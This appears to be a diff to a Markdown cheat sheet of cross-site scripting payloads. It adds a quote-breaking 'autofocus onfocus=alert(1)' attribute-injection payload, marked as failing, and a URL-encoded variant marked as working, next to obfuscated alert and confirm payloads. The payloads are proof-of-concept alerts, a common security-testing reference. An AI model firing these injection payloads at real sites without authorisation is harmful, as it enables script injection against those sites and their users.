@@ -84,3 +84,14 @@ window&&=(window&&=opener||=alert)?.(1??0,)
 ```js
 <a"/onclick=(confirm)()>Click Here!
 ```
+
+## When you find input field which allows " (quotes), try this payload:
+```js
+"autofocus onfocus=alert(1)//
+```
+-> Doesn't work
+**Try this
+```js
+"type%3d"text"autofocus%20onfocus%3d"alert(1)"
+```
+-> Works
